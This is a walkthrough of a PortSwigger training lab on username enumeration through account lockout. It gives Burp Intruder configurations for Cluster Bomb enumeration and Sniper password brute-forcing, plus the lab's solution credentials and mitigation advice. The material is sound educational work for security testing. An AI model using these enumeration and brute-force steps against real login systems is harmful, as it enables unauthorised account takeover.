# 📘 PortSwigger Lab: Username Enumeration via Account Lock

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-account-lock  
> 📄 Candidate usernames: https://portswigger.net/web-security/authentication/auth-lab-usernames  
> 📄 Candidate passwords: https://portswigger.net/web-security/authentication/auth-lab-passwords  
> 🎯 Topic: Authentication vulnerabilities — Username Enumeration via Account Lock + Password Brute Force

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🔒 Why `test:test` Does Not Trigger Lockout](#test-test)
- [🎯 Why Cluster Bomb Is Used](#cluster-bomb)
- [⚙️ Why Null Payload Is Used](#null-payload)
- [🔍 Step 1 — Find the Login Request](#step1)
- [🔍 Step 2 — Check the Normal Login Error](#step2)
- [🔍 Step 3 — Configure Intruder for Username Enumeration](#step3)
- [🔍 Step 4 — Identify a Valid Username](#step4)
- [🔍 Step 5 — Brute-force the Password](#step5)
- [🔍 Step 6 — Log in to the Account](#step6)
- [🧩 Data Used](#payloads)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)

---

<a id="goal"></a>

## 🎯 Goal

Identify a valid username using the account lock mechanism, brute-force this user's password, and access the account page.

In this lab, the application uses **account locking** after several failed login attempts. This is intended as brute-force protection, but the implementation leaks whether a username exists.

---

<a id="theory"></a>

## 🧠 Short Theory

**Account locking** temporarily blocks an account after several failed login attempts.

Example:

```text
ftp:wrong1  ❌
ftp:wrong2  ❌
ftp:wrong3  ❌
ftp:wrong4  ❌
ftp:wrong5  ❌
        ↓
Account locked
```

This can protect a specific account from targeted brute-force attacks. However, it can also become a username enumeration side channel if only existing accounts can become locked.

The normal login error is:

```text
Invalid username or password.
```

For an existing account after several incorrect attempts, the application returns:

```text
You have made too many incorrect login attempts. Please try again in 1 minute(s).
```

This difference reveals that the username is valid.

---

<a id="idea"></a>

## 🧩 Core Idea

For a non-existent user, the server always returns the generic error:

```text
username=test
password=test
        ↓
Invalid username or password.
```

Even after several attempts, no lockout occurs because there is no account to lock.

For an existing user, the behavior changes:

```text
username=ftp
password=example
        ↓
failed_attempts++
        ↓
after several attempts
        ↓
You have made too many incorrect login attempts.
```

Flow:

```text
Non-existent username
        │
        ├─ user not found
        │
        └─ Invalid username or password.


Existing username
        │
        ├─ user found
        ├─ password wrong
        ├─ failed_attempts++
        └─ Account locked
```

---

<a id="test-test"></a>

## 🔒 Why `test:test` Does Not Trigger Lockout

During manual testing, the request:

```text
username=test
password=test
```

always returns:

```text
Invalid username or password.
```

Even after multiple attempts, no account lock message appears.

This means the application does not increment the failed-attempt counter for non-existent usernames.

A simplified implementation may look like this:

```python
user = find_user(username)

if not user:
    return "Invalid username or password."

if password_is_wrong:
    user.failed_attempts += 1

if user.failed_attempts >= 5:
    return "You have made too many incorrect login attempts."
```

The issue is that the `not user` branch exits before the failed-attempt counter is reached.

---

<a id="cluster-bomb"></a>

## 🎯 Why Cluster Bomb Is Used

In the first stage, we are not trying to find the password. We need to make the application test each username several times.

If we used Sniper, the requests would look like this:

```text
carlos:example
root:example
admin:example
test:example
```

Each username would be checked only once. That is not enough to trigger account locking.

We need this pattern instead:

```text
carlos:example
carlos:example
carlos:example
carlos:example
carlos:example

root:example
root:example
root:example
root:example
root:example
```

This is why **Cluster Bomb** is used with two payload positions:

```http
username=§test§&password=example§§
```

The first payload changes the username. The second payload is empty but causes each username to be repeated several times.

---

<a id="null-payload"></a>

## ⚙️ Why Null Payload Is Used

A `Null Payload` does not modify the request. It inserts an empty value.

If the request body is:

```http
username=§test§&password=example§§
```

the password remains:

```text
example
```

However, Cluster Bomb creates combinations:

```text
Payload 1 × Payload 2
```

If Payload 1 contains 101 usernames and Payload 2 contains 5 null payloads:

```text
101 × 5 = 505 requests
```

Each username is therefore submitted five times.

---

<a id="step1"></a>

## 🔍 Step 1 — Find the Login Request

Open the login page and submit invalid credentials:

```text
username=test
password=test
```

In Burp Suite, go to:

```text
Proxy → HTTP history
```

Find the request:

```http
POST /login
```

Example request body:

```http
username=test&password=test
```

Send it to Intruder:

```text
Right click → Send to Intruder
```

---

<a id="step2"></a>

## 🔍 Step 2 — Check the Normal Login Error

The baseline response is:

```http
HTTP/2 200 OK
Content-Length: 3236
```

The HTML contains:

```html
<p class=is-warning>Invalid username or password.</p>
```

This is the normal response. Later, we look for responses that differ from it in length or body content.

---

<a id="step3"></a>

## 🔍 Step 3 — Configure Intruder for Username Enumeration

In Intruder, choose:

```text
Attack type: Cluster Bomb
```

Payload positions:

```http
username=§test§&password=example§§
```

Payload configuration:

```text
Payload 1:
Simple list → candidate usernames

Payload 2:
Null payloads → generate 5 payloads
```

Burp will submit each username five times with the same incorrect password `example`.

---

<a id="step4"></a>

## 🔍 Step 4 — Identify a Valid Username

When the attack finishes, sort responses by `Length` and inspect the response body.

Most usernames return the normal error:

```text
Invalid username or password.
```

The valid account eventually returns:

```html
<p class=is-warning>You have made too many incorrect login attempts. Please try again in 1 minute(s).</p>
```

In this walkthrough, the identified username was:

<details>
<summary>🔑 Show identified username</summary>

```text
ftp
```

</details>

This means:

```text
username exists
        ↓
server counted failed attempts
        ↓
account was temporarily locked
```

---

<a id="step5"></a>

## 🔍 Step 5 — Brute-force the Password

After identifying the username, wait about one minute for the account lock to reset.

Then create a new Intruder attack:

```text
Attack type: Sniper
```

Fix the username and only brute-force the password:

```http
username=ftp&password=§candidate_password§
```

Paste the password list:

```text
https://portswigger.net/web-security/authentication/auth-lab-passwords
```

A successful password is identified by:

```http
302 Found
```

In this walkthrough, the correct password produced a redirect:

```http
HTTP/2 302 Found
```

---

<a id="step6"></a>

## 🔍 Step 6 — Log in to the Account

Use the discovered credentials on the login page.

<details>
<summary>🔑 Show discovered credentials</summary>

```text
Username: ftp
Password: 12345678
```

</details>

After accessing the account page, the lab is solved.

---

<a id="payloads"></a>

## 🧩 Data Used

Username list:

```text
https://portswigger.net/web-security/authentication/auth-lab-usernames
```

Password list:

```text
https://portswigger.net/web-security/authentication/auth-lab-passwords
```

First attack:

```http
username=§candidate_username§&password=example§§
```

Payload 2:

```text
Null payloads × 5
```

Second attack:

```http
username=ftp&password=§candidate_password§
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

The developer tried to prevent brute-force attacks using account lockout.

However, the failed-attempt counter was only reached for existing users.

For a non-existent username:

```text
user not found
        ↓
Invalid username or password.
```

For an existing username:

```text
user found
        ↓
password wrong
        ↓
failed_attempts++
        ↓
account locked
```

This created a side channel: the account lock message disclosed that the username existed.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

Correct thought process:

```text
1. Check the normal login error.
2. Test whether lockout appears.
3. Notice that non-existent usernames do not lock.
4. Repeat each username several times.
5. Find the username that produces the account lock message.
6. Wait for the lockout to reset.
7. Brute-force only the confirmed username.
```

Main lesson:

```text
A security control can become an information leak.
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### 1. Brute-forcing passwords first

If the username is unknown, password brute-force is inefficient and misleading.

### 2. Using Sniper in the first stage

Sniper checks each username only once and does not trigger account locking.

### 3. Misconfiguring Null Payload

The second payload should be empty and used only to repeat requests.

### 4. Looking only at the status code

During username enumeration, the status code usually remains `200 OK`. The response body and length are more important.

### 5. Not waiting for the lockout to reset

Before brute-forcing the password, wait for the account lock timer to expire.

---

<a id="defense"></a>

## 🛡 Mitigation

Proper defenses:

- return identical messages for existing and non-existing users;
- avoid revealing account lockout state in a way that confirms username validity;
- apply rate limiting by IP, username, and IP + username;
- use progressive delays;
- use MFA;
- log large-scale login attempts;
- detect password spraying and credential stuffing;
- test authentication responses for information leaks.

Weak design:

```text
Invalid username or password.
```

for non-existent users, but:

```text
You have made too many incorrect login attempts.
```

for existing users.

---

<a id="checklist"></a>

## ✅ Checklist

- [x] `POST /login` request found.
- [x] Normal `Invalid username or password.` response confirmed.
- [x] Confirmed that a non-existent username does not lock.
- [x] `Cluster Bomb` configured.
- [x] `Null Payload × 5` configured.
- [x] Account lock message found.
- [x] Valid username identified.
- [x] Lockout reset waited.
- [x] `Sniper` configured for password brute-force.
- [x] `302 Found` response identified.
- [x] Logged in to the account.
- [x] Lab solved.

---

# ⬆ Back to Top

[Return to contents](#top)
